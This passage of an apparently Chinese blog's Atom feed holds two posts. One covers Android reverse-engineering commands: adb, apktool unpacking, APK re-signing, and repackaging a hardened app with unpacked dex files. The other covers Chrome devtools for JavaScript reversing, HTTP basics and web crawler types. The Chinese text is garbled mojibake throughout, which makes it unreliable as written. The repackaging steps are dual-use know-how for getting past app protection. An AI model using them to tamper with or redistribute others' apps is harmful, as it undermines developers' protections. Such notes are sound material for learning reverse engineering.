·å°±å¯ä»¥ä¸ç”¨è¿æ•°æ®çº¿äº†</span></span><br></pre></td></tr></table></figure><p>adb shell dumpsys window |grep mCurrentFocus æŸ¥çœ‹é¡¶ç«¯å‰å°åº”ç”¨çš„åŒ…åå’Œactivityå</p><p>dumpsys activity top</p><h1>å…¶ä»–å¸¸ç”¨å‘½ä»¤</h1><p>pm -l åˆ—å‡ºåŒ…å</p><p>pm -l | grep xx è°ƒå‡ºåŒ…å« xxçš„ç»“æœ</p><p>aapt dump badging apkåç§° æŸ¥çœ‹apkæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯</p><p>ps -e | grep package æŸ¥çœ‹æŒ‡å®šåŒ…çš„è¿›ç¨‹å·</p><p>ps aux |grep -i xxx  æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</p><p>çŸ¥é“è¿›ç¨‹å·å¯ä»¥è¿›å…¥è¿›ç¨‹å·çš„è·¯å¾„ä¸‹ cd /proc/è¿›ç¨‹å·</p><p>cat statusä¸‹æœ‰ä¸€ä¸ª TracePid</p><p>am start-activity package  å¯åŠ¨app</p><p>pm uninstall package å¸è½½</p><h1>apktool</h1><p><code>apktool d apkåå­—</code>  è¿›è¡Œapkè§£åŒ…</p><p><code>apktool b ./app-debug/ </code> è¿›è¡Œé‡æ‰“åŒ…(app-debug/ä¸‹æ˜¯apkæ–‡ä»¶çš„åŸºæœ¬ç»„æˆç»“æ„)</p><ul><li>è¿›è¡Œé‡æ‰“åŒ…æ—¶ éœ€è¦è¿›è¡Œç­¾å</li></ul><ol><li>ç”Ÿæˆè¯ä¹¦   å¯ä»¥ä¸‹è½½kseï¼Œè¿è¡Œkse.shå¯¹è¯ä¹¦è¿›è¡ŒæŸ¥çœ‹</li></ol><p><code>keytool -genkeypair -alias mysigner -keyalg RSA -validity 40000 -keystore android.keystore</code></p><ol start="2"><li>ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹appæ˜¯å¦éœ€è¦ç­¾å<br><code>apksigner verify -v --print-certs --in appåç§°</code></li><li>ä½¿ç”¨è¯ä¹¦è¿›è¡Œç­¾å<br><code>apksigner sign --ks android.keystore --ks-key-alias mysigner --out è‡ªå®šä¹‰ä¸€ä¸ªapkåç§° åŸå…ˆappåç§°</code></li></ol><p>ç¬¬äºŒä¸­ç­¾åå‘½ä»¤</p><p><code>keytool -genkey -alias abc.keystore -keyalg RSA -validity 2000 -keystore abc,key</code></p><p><code>jarsigner -verbose -keystore abc.keystore -signedjar xxx_patch.apk xxx.apk abc.keystore</code></p><p><strong>å½“å¯¹åŠ å›ºçš„apkè¿›è¡Œé‡æ‰“åŒ…æ—¶</strong></p><ol><li>é‡æ‰“åŒ…æ—¶åº”è¯¥ä½¿ç”¨è„±å£³ååŸå§‹apkçš„dexæ›¿æ¢æ‰åŸæ¥çš„å£³dex</li><li>appåœ¨åŠ å›ºåçš„å…¥å£ç‚¹å˜ä¸ºå£³çš„å…¥å£ç‚¹ï¼Œå› æ­¤åœ¨é‡æ‰“åŒ…åè¿˜éœ€è¦ä¿®æ”¹AndroidManifest.xmlå…¥å£ç±»</li></ol><p><em>å…·ä½“å‘½ä»¤å¦‚ä¸‹</em></p><ol><li>apktool d xxx.apk -s ç„¶ååˆ é™¤åŸå§‹dexï¼Œå¹¶å°†è„±å£³ådexæŒ‰æ–‡ä»¶å¤§å°ä¾æ¬¡å‘½åclasses.dex,classes2.dex</li><li>jadxæ‰“å¼€åŒ…å«ç®¡ä»¶ç±»çš„dexæ–‡ä»¶ å¹¶æœç´¢extends Applicationçš„ä»£ç ï¼Œå®šä½å…³é”®ç±»ï¼Œå°†åç¼–è¯‘ç»“æœç›®å½•ä¸‹AndroidManifest.xmlæ¸…å•æ–‡ä»¶å†…<Application>ç»“ç‚¹çš„androidï¼šnameå¯¹åº”çš„å€¼ä¿®æ”¹ä¸ºæ‰¾åˆ°çš„å®Œæ•´ç±»å</Application></li><li>å¯¹åç¼–è¯‘åç›®å½• apktool b xxx.apk ç„¶åç­¾åæ­£å¸¸è¿è¡Œ</li><li>ç„¶åå†åç¼–è¯‘ä¿®æ”¹smail å†æ‰“åŒ…ç­¾åå³å¯å®ç°åŠŸèƒ½</li></ol>]]></content>
    
    
    <summary type="html">ğŸ‡Androidé€†å‘å­¦ä¹ çš„å‰ç½®çŸ¥è¯†</summary>
    
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="åŸºæœ¬å‘½ä»¤" scheme="https://zxk1ng.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>ASTæ··æ·†ä¸åæ··æ·†</title>
    <link href="https://zxk1ng.github.io/posts/95017dfa.html"/>
    <id>https://zxk1ng.github.io/posts/95017dfa.html</id>
    <published>2025-01-15T06:54:58.000Z</published>
    <updated>2025-01-15T07:14:39.049Z</updated>
    
    <content type="html"><![CDATA[<h1>ASTæ··æ·†ä¸è§£æ··æ·†</h1><h1>Webç½‘ç«™çš„è°ƒè¯•ä¸æŠ“åŒ…åˆ†æ</h1><h2 id="Chromeå¼€å‘è€…å·¥å…·">Chromeå¼€å‘è€…å·¥å…·</h2><p>æ‰“å¼€æ–¹å¼ï¼š</p><ul><li>F12</li><li>ctrl+shift+Iç»„åˆ</li><li>å³å‡»ç½‘é¡µé¡µé¢ï¼Œç‚¹å‡»æ£€æŸ¥</li><li>åœ¨å³ä¸Šè§’ä¸‰ä¸ªç‚¹ ==ã€‹ æ›´å¤šå·¥å…·</li><li>åœ¨æµè§ˆå™¨ä¸­æ–°å»ºçª—å£ï¼Œä½¿ç”¨ä¸Šè¿°ä»»æ„æ–¹æ³•æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåœ¨åˆ‡å›è¦è°ƒè¯•çš„ç•Œé¢</li></ul><h3 id="Elementsé¢æ¿">Elementsé¢æ¿</h3><p>æ˜¾ç¤ºé¡µé¢æºç çš„DOMæ ‘ï¼Œå¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œå¢åˆ æ”¹æŸ¥ã€‚ä¸»è¦ç”¨æ¥å¯¹é¡µé¢è¿›è¡Œä¿®é¥°ç¾åŒ–ï¼Œå®ƒå¹¶ä¸æ˜¯æºä»£ç </p><p>è·å–æºä»£ç æ–¹å¼ï¼š</p><ul><li>å³é”® ==ã€‹æŸ¥çœ‹æºä»£ç  æˆ–è€… ctrl+u</li><li>sourceé¢æ¿</li></ul><p>åœ¨Elementsé¢æ¿ä¸‹æ–­ç‚¹(å³å‡» ==ã€‹break on )</p><ul><li>å­æ ‘ä¿®æ”¹ï¼šåœ¨èŠ‚ç‚¹å­æ ‘å‘ç”Ÿä¿®æ”¹æ—¶æ–­ç‚¹</li><li>å±æ€§ä¿®æ”¹ï¼šåœ¨èŠ‚ç‚¹å±æ€§å‘ç”Ÿä¿®æ”¹æ—¶æ–­ç‚¹</li><li>ç§»é™¤èŠ‚ç‚¹ï¼šåœ¨èŠ‚ç‚¹è¢«ç§»é™¤æ—¶å‘ç”Ÿæ–­ç‚¹</li></ul><h3 id="Consoleé¢æ¿">Consoleé¢æ¿</h3><p>ç‚¹å‡»æŸä¸ªèŠ‚ç‚¹ï¼š</p><ul><li>$0ï¼šå¯¹å½“å‰é€‰ä¸­çš„èŠ‚ç‚¹è¿›è¡Œå¼•ç”¨</li><li>$1ï¼šå¯¹ä¸Šä¸€æ¬¡é€‰ä¸­çš„èŠ‚ç‚¹è¿›è¡Œå¼•ç”¨</li><li>ä»¥æ­¤ç±»æ¨ ä¸€ç›´å›æº¯åˆ°$4</li></ul><p>CSSé€‰æ‹©å™¨è¯­æ³•å¼•ç”¨èŠ‚ç‚¹</p><ul><li>å¤åˆ¶éœ€è¦å®šä½çš„èŠ‚ç‚¹çš„selectorï¼Œä½¿ç”¨document.querySelector(â€œè·¯å¾„â€)</li><li>å¦‚æœè¦é€‰æ‹©æ‰€æœ‰ç¬¦åˆCSSé€‰æ‹©å™¨è¯­æ³•çš„èŠ‚ç‚¹document.querySelectorAll</li></ul><p>è§‚å¯Ÿä¸æ£€æŸ¥äº‹ä»¶ç›‘å¬å™¨</p><ul><li>monitorEvents()ï¼šç›‘å¬ç›®æ ‡äº‹ä»¶ä¿¡æ¯</li><li>unmonitorEvents()ï¼šåœæ­¢ç›‘å¬</li><li>getEventListeners()ï¼šè·å–DOMèŠ‚ç‚¹çš„ç›‘å¬å™¨</li></ul><p>monitorEvents()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦ç›‘å¬çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦ç›‘å¬çš„äº‹ä»¶å­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦ä¸²æ•°ç»„</p><p>Elementsé¢æ¿çš„Event Listenerså¯ä»¥çœ‹ç›‘å¬å™¨</p><h3 id="Sourceé¢æ¿">Sourceé¢æ¿</h3><p>æ–­ç‚¹ï¼šå¦‚æœè¡¨è¾¾å¼æœ‰å¤šè¡Œï¼Œåœ¨å…¶ä¸­æ‰‹åŠ¨ä¸€ä¸ªæ–­ç‚¹ï¼Œä¼šæ–­åœ¨ä¸‹ä¸€ä¸ªè¡¨è¾¾å¼ä¸Šã€‚</p><p>æ¡ä»¶æ–­ç‚¹ï¼šè¡¨è¾¾å¼trueæ‰ä¼šæ–­ä¸‹</p><p>XHR/fetch Breakpointsï¼šå½“xhrä¸urlå­ä¸²åŒ¹é…æ—¶è§¦å‘æ–­ç‚¹</p><p>å¦‚æœæƒ³åœ¨xhrç”Ÿå‘½å‘¨æœŸçš„æŸä¸ªé˜¶æ®µè§¦å‘æ–­ç‚¹ï¼Œå¯ä»¥åœ¨ Event Listener Breakpointsçª—ä¸­æŸ¥çœ‹XHRç›®å½•</p><h3 id="Applicationé¢æ¿">Applicationé¢æ¿</h3><p>å¯ä»¥æŸ¥çœ‹å’Œåˆ é™¤Cookieï¼Œä½†æ˜¯ä¸èƒ½ä¿®æ”¹Cookieå€¼ã€‚</p><p>ä½¿ç”¨localstorageæœ¬åœ°å­˜å‚¨æ¥å­˜å‚¨é”®å€¼å¯¹ï¼Œå¯ä»¥åœ¨å…¶ä¸­è¿›è¡Œé”®å€¼å¯¹çš„æ£€æŸ¥ä¿®æ”¹å’Œåˆ é™¤æ“ä½œ</p><ul><li>setItem()ï¼šå­˜å‚¨ä¸€ä¸ªåç§°ä¸ºkeyçš„å€¼valueï¼Œå¦‚æœvalueå­˜åœ¨å°±æ›´æ–°</li><li>getItem()ï¼šè·å–åç§°ä¸ºkeyçš„valueå€¼ï¼Œå¦‚æœkeyä¸å­˜åœ¨å°±null</li><li>removeItem()ï¼šåˆ é™¤åç§°ä¸ºkeyçš„ä¿¡æ¯ï¼Œ</li><li>clear()ï¼šæ¸…ç©ºlocalstorageæ‰€æœ‰ä¿¡æ¯</li><li>key()ï¼šé”®çš„ç´¢å¼•</li></ul><h3 id="jsé€†å‘æŠ€å·§">jsé€†å‘æŠ€å·§</h3><p>å…¨å±€æœç´¢ï¼šctrl+shift+F</p><p>consoleæ’æ¡©ï¼šæ¡ä»¶è¡¨è¾¾å¼ä¸­æ·»åŠ console.log</p><p>å¤åˆ¶consoleé¢æ¿ï¼š</p><ul><li>copy()</li><li>JSON:stringify()</li><li>Object.toString()</li><li>CryptoJS.enc.Utf8.stringify() éœ€è¦åœ¨snippetsæ·»åŠ CryptoJSåŠ å¯†åº“</li></ul><h2 id="æœ¬åœ°è¦†ç›–">æœ¬åœ°è¦†ç›–</h2><p>Chromeä¸­</p><ul><li>sourceé¢æ¿ä¸­åˆ‡æ¢åˆ°æ›¿æ¢ï¼Œé€‰æ‹©è¦è¿›è¡Œæ›¿æ¢çš„æ–‡ä»¶å¤¹ï¼Œåœ¨ç½‘ç»œé¢æ¿ä¸­æ‰¾åˆ°æŸä¸ªè¯·æ±‚è¿›è¡Œæ›¿æ¢Save foroverridesèœå•é¡¹</li><li>fiddlerè‡ªåŠ¨å“åº”<img src="/posts/95017dfa.htm/image-20241112212044355.png" alt="image-20241112212044355"></li></ul><h1>çˆ¬è™«ä¸åçˆ¬è™«</h1><p>å®Œæ•´çˆ¬è™«æµç¨‹ï¼š</p><ul><li>å‘èµ·ä¸€æ¬¡httpè¯·æ±‚</li><li>æœåŠ¡ç«™ç‚¹è¿›è¡Œä¸€æ¬¡å“åº”</li><li>å¯¹è¿”å›ä¿¡æ¯è¿›è¡Œæ•°æ®è§£æä¸æ¸…æ´—</li><li>æ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“æˆ–è€…æœ¬åœ°æ–‡ä»¶</li></ul><p><img src="/posts/95017dfa.htm/image-20241112213016930.png" alt="image-20241112213016930"></p><h2 id="ç½‘ç»œè¯·æ±‚">ç½‘ç»œè¯·æ±‚</h2><h3 id="å‘é€è¯·æ±‚">å‘é€è¯·æ±‚</h3><p>httpè¯·æ±‚æŠ¥æ–‡ä¸»è¦æ˜¯å››éƒ¨åˆ†ï¼šè¯·æ±‚è¡Œï¼Œè¯·æ±‚å¤´éƒ¨ï¼Œç©ºè¡Œå’Œè¯·æ±‚ä½“<img src="/posts/95017dfa.htm/image-20241112213004971.png" alt="image-20241112213004971"></p><h4 id="è¯·æ±‚è¡Œ">è¯·æ±‚è¡Œ</h4><p>ä¸»è¦æœ‰ä½œç”¨çš„æ˜¯ï¼šè¯·æ±‚æ–¹æ³•ï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œhttpåè®®ç‰ˆæœ¬</p><p>8ä¸­è¯·æ±‚æ–¹æ³•</p><ol><li>GETï¼šå‘ç›®æ ‡æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼Œè¿”å›å®ä½“ä¸»ä½“</li><li>POSTï¼šå‘ç›®æ ‡æœåŠ¡å™¨å‘é€èµ„æºï¼Œä¾‹å¦‚æäº¤è¡¨è¾¾</li><li>HEADï¼šä¸getç±»ä¼¼ï¼Œä¸è¿‡ä»–ç”¨äºè·å–æŠ¥å¤´ï¼Œä¸ä¼šè¿”å›å…·ä½“å†…å®¹</li><li>PUTï¼šå‘ç›®æ ‡æœåŠ¡å™¨å‘é€æ•°æ®ä»¥è¦†ç›–æŒ‡å®šå†…å®¹</li><li>DELETEï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤URLæŒ‡å®šå†…å®¹</li><li>OPTIONSï¼šè¿”å›ç›®æ ‡æœåŠ¡å™¨é’ˆå¯¹ç‰¹å®šèµ„æºçš„HTTPè¯·æ±‚æ–¹æ³•</li><li>TRACEï¼šç”¨äºæµ‹è¯•è¯Šæ–­ï¼Œå›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚</li><li>CONNECTï¼šHTTP1.1åè®®é¢„ç•™ç»™èƒ½å¤Ÿå°†é“¾æ¥ä¿®æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨</li></ol><p><strong>Http1.0ä¸­åªæœ‰å‰ä¸‰ç§è¯·æ±‚æ–¹æ³•</strong></p><p>GETç”¨äºè·å–ç½‘é¡µèµ„æºï¼ŒPOSTå¸¸ç”¨æ¥æ¨¡æ‹Ÿç™»å½•</p><p>è¯·æ±‚è¡Œä¸­çš„<strong>ç»Ÿä¸€èµ„æºå®šä½ç¬¦</strong>å®é™…ä¸Šå°±æ˜¯<strong>URL</strong></p><h4 id="è¯·æ±‚å¤´éƒ¨">è¯·æ±‚å¤´éƒ¨</h4><p>è¯·æ±‚å¤´éƒ¨ä¸»è¦ç”±ä¸€ç³»åˆ—é”®å€¼å¯¹ç»„æˆï¼Œç”¨æ¥è¯´æ˜æœåŠ¡å™¨éœ€è¦çš„é™„å±ä¿¡æ¯ï¼Œé€šå¸¸åçˆ¬è™«å°±æ˜¯åœ¨è¯·æ±‚å¤´éƒ¨é‡Œè¿›è¡Œï¼Œæ£€æµ‹æ˜¯å¦åŒ…å«å…³é”®é”®å€¼å¯¹ï¼Œå¦‚æœä¸å­˜åœ¨æˆ–è€…æ•°æ®ä¸åŒ¹é…å°±ä¼šè¢«åˆ¤å®šä¸ºæœºå™¨äºº</p><p>å¸¸ç”¨8ä¸ªé”®å€¼å¯¹</p><ol><li>Accept-Charsetï¼šå®¢æˆ·ç«¯å¯ä»¥æ¥å—çš„å­—ç¬¦é›†</li><li>Cookieï¼šç½‘ç«™ç”¨æ¥è¯†åˆ«èº«ä»½æ‰€ç”¨çš„åŠ å¯†é”®å€¼å¯¹ï¼Œéœ€è¦ç™»å½•æ‰èƒ½è®¿é—®çš„ç½‘ç«™é€šå¸¸éœ€è¦æºå¸¦</li><li>Connectionï¼šè¡¨ç¤ºæ˜¯å¦éœ€è¦æŒä¹…è¿æ¥ï¼Œcloseä»£è¡¨æœ¬æ¬¡å“åº”åè¿æ¥å¯ä»¥è¢«å…³é—­</li><li>Content-Typeï¼šè¯·æ±‚ä½“æ•°æ®ç±»å‹</li><li>Content-Lengthï¼šè¯·æ±‚ä½“çš„é•¿åº¦</li><li>Hostï¼šè¯·æ±‚çš„ä¸»æœºå</li><li>Refererï¼šæŒ‡æ˜ç”¨æˆ·ä»è¯¥URLå‡ºå‘åˆ°è¾¾æ­¤é¡µé¢ï¼Œå¸¸ç”¨äºé˜²ç›—é“¾æŠ€æœ¯</li><li>User-Agentï¼šæœåŠ¡å™¨ç”¨æ¥è¯†åˆ«æµè§ˆå™¨ç±»å‹ï¼Œå¯æ›´æ”¹è¿™ä¸ªå‚æ•°è¾¾åˆ°åˆ‡æ¢è®¡ç®—æœºç«¯ä¸æ‰‹æœºç«¯çš„æ•ˆæœ</li></ol><h4 id="ç©ºè¡Œ">ç©ºè¡Œ</h4><p>å¿…é¡»å­˜åœ¨äºhttpè¯·æ±‚å¤´éƒ¨ä¹‹åï¼Œä¹Ÿå°±æ˜¯è¾“å…¥â€œ\n\râ€ï¼Œä»–çš„ä½œç”¨åœ¨äºé€šçŸ¥ç›®æ ‡æœåŠ¡å™¨æ­¤åä¸ä¼šå†å‡ºç°è¯·æ±‚å¤´éƒ¨ï¼Œå°†è¿›å…¥è¯·æ±‚ä½“ã€‚</p><h4 id="è¯·æ±‚ä½“">è¯·æ±‚ä½“</h4><p>åœ¨GETæ–¹æ³•ä¸­ä¸€èˆ¬ä¸å­˜åœ¨è¯·æ±‚ä½“ï¼Œè¯·æ±‚ä½“é€‚ç”¨äºPOSTæ–¹æ³•ï¼Œå†…å®¹æ˜¯ç”¨æˆ·åœ¨å¡«å†™è¡¨å•æ—¶æäº¤çš„æ•°æ®ï¼Œä»–çš„æ ¼å¼æ˜¯ç”¨&amp;è¿æ¥çš„é”®å€¼å¯¹ï¼Œå¦‚name=test&amp;password=123ã€‚</p><h3 id="è§£æå“åº”">è§£æå“åº”</h3><p>è¿”å›çš„httpå“åº”æŠ¥æ–‡åŒ…å«äº†å®¢æˆ·ç«¯éœ€è¦çš„æ•°æ®ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡è§‚å¯ŸæŠ¥æ–‡ä¸­çš„ä¸€äº›å…³é”®ä¿¡æ¯æ¥ç¡®è®¤å“åº”çš„å®é™…æƒ…å†µï¼Œhttpå“åº”æŠ¥æ–‡ç»“æ„ï¼š<img src="/posts/95017dfa.htm/image-20241112231535605.png" alt="image-20241112231535605"></p><p>å››ä¸ªéƒ¨åˆ†ï¼šçŠ¶æ€è¡Œï¼Œå“åº”å¤´ï¼Œç©ºè¡Œï¼Œå“åº”ä½“ã€‚</p><p>çŠ¶æ€è¡Œä¸­åŒ…æ‹¬çŠ¶æ€ç å’ŒçŠ¶æ€ç æè¿°ã€‚</p><h4 id="å“åº”è¡Œ">å“åº”è¡Œ</h4><p>çŠ¶æ€ç state codeä¸»è¦ç”±ä¸‰ä½æ•°å­—æ„æˆï¼Œç¬¬ä¸€ä½æ•°å­—ç”¨æ¥è¾¨åˆ«å“åº”ç±»å‹ï¼Œåä¸¤ä½ç”¨æ¥åŒºåˆ†</p><ul><li>1xxï¼šæœåŠ¡å™¨æˆåŠŸæ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå®¢æˆ·ç«¯å¯ç»§ç»­å‘è¯·æ±‚</li><li>2xxï¼šæœåŠ¡å™¨æˆåŠŸæ¥æ”¶è¯·æ±‚ï¼Œå¹¶ç€æ‰‹è¿›è¡Œå¤„ç†</li><li>3xxï¼šæœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯é‡å®šå‘</li><li>4xxï¼šæœåŠ¡å™¨è¡¨æ˜å®¢æˆ·ç«¯è¯·æ±‚éæ³•</li><li>5xxï¼šæœåŠ¡å™¨å‘ç”Ÿé”™è¯¯</li></ul><p>ç†Ÿè®°çš„10ç§çŠ¶æ€ç ï¼šçœç•¥</p><h4 id="å“åº”å¤´">å“åº”å¤´</h4><p>ä¸å¿…å¯¹å…¶æœ‰å¤ªå¤šç†è§£ï¼Œå¶å°”è§‚å¯Ÿå‡ ä¸ªé”®å€¼å¯¹è¾…è¯å“åº”çŠ¶æ€ç çš„æè¿°ã€‚</p><ol><li>Locationï¼šåœ¨301æˆ–è€…302ä¸‹è¿”å›çš„é‡å®šå‘åçš„urlåœ°å€</li><li>Connectï¼šcloseè¡¨ç¤ºæœ¬æ¬¡å“åº”åè¿æ¥å°†è¢«å…³é—­ï¼›keepaliveè¡¨ç¤ºé•¿ä¹…è¿æ¥ï¼ŒæœåŠ¡å™¨ä¼šç­‰å¾…å®¢æˆ·ç«¯ä¸‹æ¬¡è¯·æ±‚</li><li>Serverï¼šæœåŠ¡å™¨ç”¨æ¥å¤„ç†è¯·æ±‚çš„è½¯ä»¶ä¿¡æ¯åŠå…¶ç‰ˆæœ¬ï¼Œä¸httpè¯·æ±‚ä¸­User-agentç±»ä¼¼ï¼Œä¸è¿‡å®ƒä»£è¡¨æœåŠ¡å™¨ç«¯ä¿¡æ¯</li></ol><h4 id="ç©ºè¡Œ-2">ç©ºè¡Œ</h4><p>å“åº”å¤´åå¿…é¡»åŠ å…¥â€œ\n\râ€ï¼Œä»–çš„ä½œç”¨è¡¨ç¤ºæ¥ä¸‹æ¥è¿›å…¥å“åº”ä½“</p><h4 id="å“åº”ä½“">å“åº”ä½“</h4><h2 id="ç½‘ç»œçˆ¬è™«åˆ†ç±»">ç½‘ç»œçˆ¬è™«åˆ†ç±»</h2><p>ç½‘ç»œçˆ¬è™«åˆ†ä¸ºé€šç”¨ç½‘ç»œçˆ¬è™«ï¼Œèšç„¦ç½‘ç»œçˆ¬è™«ï¼Œå¢é‡å¼ç½‘ç»œçˆ¬è™«ï¼Œæ·±å±‚ç½‘ç»œçˆ¬è™«</p><h3 id="é€šç”¨ç½‘ç»œçˆ¬è™«">é€šç”¨ç½‘ç»œçˆ¬è™«</h3><p>åˆå«å…¨ç½‘çˆ¬è™«ï¼Œå®ƒçš„ç›®æ ‡æ˜¯æ•´ä¸ªäº’è”ç½‘ï¼Œçˆ¬å–æ•°æ®ä¸°å¯Œï¼Œå¸¸ç”¨è¯­æœç´¢å¼•æ“ä¸­ã€‚å¾€å¾€ä»ä¸€ä¸ªurlå¼€å§‹ï¼Œè¾—è½¬çˆ¬å–ï¼Œæœ€ç»ˆæ‹“å±•åˆ°æ•´ä¸ªç½‘ç»œã€‚</p><p>æ·±åº¦ä¼˜å…ˆçˆ¬å–ç­–ç•¥å’Œå¹¿åº¦ä¼˜å…ˆçˆ¬å–ç­–ç•¥è¾ƒä¸ºå¸¸è§</p><ul><li>æ·±åº¦ä¼˜å…ˆçˆ¬å–ç­–ç•¥ï¼šæŒ‰ç…§é¡µé¢æ·±åº¦è¿›è¡Œæ’åºï¼Œä¸€æ¬¡è®¿é—®ä¸€çº§URLï¼Œç›´åˆ°è§¦åº•æ— æ³•æ·±å…¥</li><li>å¹¿åº¦ä¼˜å…ˆçˆ¬å–ç­–ç•¥ï¼šæŒ‰ç…§é¡µé¢å†…å®¹ç›®å½•å±‚æ¬¡è¿›è¡Œåˆ’åˆ†ï¼Œçˆ¬å–å®ŒåŒä¸€å±‚æ¬¡çš„URLæ‰ä¼šç»§ç»­ä¸‹ä¸€å±‚è¿›è¡Œçˆ¬å–</li></ul><h3 id="èšç„¦ç½‘ç»œçˆ¬è™«">èšç„¦ç½‘ç»œçˆ¬è™«</h3><p>æ›´é€‚ç”¨äºæ—¥å¸¸çˆ¬è™«çš„éœ€è¦ï¼Œå¹¶ä¸éœ€è¦çˆ¬å–æ•´ä¸ªäº’è”ç½‘æ•°æ®ï¼Œå®ƒä¸“æ³¨äºæŸä¸€ä¸»é¢˜ï¼Œé€‰æ‹©æ€§çš„çˆ¬å–ç½‘é¡µä¸Šä¸å¼€å‘è€…å®šä¹‰çš„è§„åˆ™ç›¸åŒ¹é…çš„æ•°æ®èµ„æº</p><p>å››ç§çˆ¬å–ç­–ç•¥</p><ol><li>åŸºäºå†…å®¹è¯„ä»·ï¼šå°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯ä½œä¸ºä¸»é¢˜è¿›è¡Œçˆ¬å–ï¼Œé¡µé¢åŒ…å«ç”¨æˆ·è¾“å…¥ä¿¡æ¯åˆ™è®¤ä¸ºä¸ä¸»é¢˜æœ‰å…³</li><li>åŸºäºé“¾æ¥è¯„ä»·ï¼šæ ¹æ®é¡µé¢ç»“æ„ä¿¡æ¯åˆ†æçˆ¬å–çš„urlçš„é‡è¦æ€§ï¼Œæ ¹æ®é‡è¦ç¨‹åº¦è¿›è¡Œçˆ¬å–ä¼˜å…ˆçº§çš„æ’åº</li><li>åŸºäºå¢å¼ºå­¦ä¹ ï¼šåˆ©ç”¨æ¦‚ç‡ç»Ÿè®¡ä¸­çš„è´å¶æ–¯åˆ†ç±»å™¨ï¼Œæ ¹æ®ç½‘é¡µå†…å®¹å’Œé“¾æ¥æ–‡æœ¬å¯¹URLè¿›è¡Œåˆ†ç±»ï¼Œè®¡ç®—å‡ºURLçš„æƒé‡ï¼Œæ¥å†³å®šçˆ¬å–é¡ºåº</li><li>åŸºäºè¯­å¢ƒå›¾ï¼šç»“åˆæœºå™¨å­¦ä¹ ç³»ç»Ÿï¼Œè®¡ç®—å½“å‰é¡µé¢åˆ°ç›¸å…³çš„é¡µé¢çš„è·ç¦»ï¼Œè·ç¦»è¶Šè¿‘çš„é¡µé¢çš„URLåˆ™è¶Šä¼˜å…ˆè®¿é—®</li></ol><h3 id="å¢é‡å¼ç½‘ç»œçˆ¬å‡º">å¢é‡å¼ç½‘ç»œçˆ¬å‡º</h3><p>ä¸»è¦ç›®çš„æ˜¯é•¿ä¹…çš„ç»´æŒä¸€ä¸ªæ•°æ®åº“ï¼Œå¯¹æ•°æ®çš„ç¨³å¥æ€§å’Œå®æ—¶æ€§å…·æœ‰é«˜è¦æ±‚ï¼Œå†æ¬¡çˆ¬å–æ—¶å°±ä¼šåªçˆ¬å–æ–°å‡ºç°çš„æˆ–è€…å‘ç”Ÿæ”¹å˜çš„æ•°æ®ï¼Œå¯¹äºæ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„é¡µé¢æˆ–è€…æ•°æ®ä¸ä¼šçˆ¬å–</p><p>ä¸‰ç§å¸¸ç”¨ç­–ç•¥</p><ol><li>ç»Ÿä¸€æ›´æ–°ï¼šæ¯éš”ä¸€æ®µæ—¶é—´å°†æ‰€æœ‰é¡µé¢å†è®¿é—®ä¸€éï¼Œä»¥è¾¾åˆ°æ›´æ–°æ•°æ®çš„ç›®çš„</li><li>ä¸ªä½“æ›´æ–°ï¼šæ ¹æ®ä¸ªä½“ç½‘ç«™çš„æ•°æ®å˜åŒ–é¢‘ç‡æ¥æŒ‡å®šé‡æ–°è®¿é—®æ—¶é—´</li><li>åˆ†ç±»æ›´æ–°ï¼šå°†ç½‘é¡µåŒºåˆ†ä¸ºæ•°æ®å˜åŒ–è¿…é€Ÿçš„å’Œæ•°æ®å˜åŒ–ç¼“æ…¢çš„ï¼Œä»¥ä¸åŒé¢‘ç‡è®¿é—®è¿™ä¸¤ç±»ç½‘é¡µ</li></ol><h3 id="æ·±å±‚ç½‘ç»œçˆ¬è™«">æ·±å±‚ç½‘ç»œçˆ¬è™«</h3><p>ä¸»è¦æŒ‡çš„æ˜¯æ²¡æ³•ç›´æ¥è®¿é—®çš„é¡µé¢ï¼Œè¿™ç±»é¡µé¢ä¿¡æ¯é€šå¸¸è¦æ»¡è¶³ä¸€å®šçš„è¦æ±‚æ‰å¯ä»¥æµè§ˆï¼Œä»–éšè—åœ¨ä¸€äº›è¡¨å•ä¹‹åï¼Œä¸èƒ½é€šè¿‡é™æ€é“¾æ¥ç›´æ¥è·å–ã€‚ä¾‹å¦‚ä¸€äº›å¿…é¡»ç™»å½•ï¼Œæ³¨å†Œåæ‰èƒ½è®¿é—®çš„ç½‘ç«™ã€‚è¿™ç±»çˆ¬è™«åªéœ€è¦æ­é…getå’Œpostè¯·æ±‚å°±å¯ä»¥è®¿é—®ï¼Œéš¾ç‚¹åœ¨äºç ´è§£postæäº¤ä¿¡æ¯æ—¶çš„ç½‘é¡µæ•°æ®åŠ å¯†</p><p>ä¸¤ç§ç­–ç•¥</p><ol><li>åŸºäºé¢†åŸŸçŸ¥è¯†ï¼šç»´æŠ¤ä¸€ä¸ªæœ¬åœ°çš„è¯åº“ï¼Œé€šè¿‡è¯­ä¹‰åˆ†ææ¥é€‰å–åˆé€‚çš„å…³é”®è¯å¡«å†™è¡¨å•</li><li>åŸºäºç½‘é¡µç»“æ„åˆ†æï¼šåœ¨é¢†åŸŸçŸ¥è¯†æ¬ 